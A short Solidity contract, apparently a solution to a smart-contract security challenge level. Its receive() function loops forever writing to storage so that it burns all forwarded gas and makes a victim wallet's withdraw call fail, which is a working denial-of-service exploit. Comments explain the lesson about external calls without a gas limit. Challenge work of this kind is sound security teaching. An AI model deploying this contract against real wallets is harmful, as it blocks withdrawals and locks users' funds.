// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

// Uncomment this line to use console.log
// import "hardhat/console.sol";

contract Hack {

    //! Wallets call function doesnt give any gas limit so we will consume all gas
    //!and crash the withdraw function
    //! This level demonstrates that external calls to unknown contracts can still 
    //!create denial of service attack vectors if a fixed amount of gas is not specified.
   receive()external payable{
    while(true){
        assembly{
            let value:=sload(0x00)

            sstore(value,42)
        }
    }
   }
}
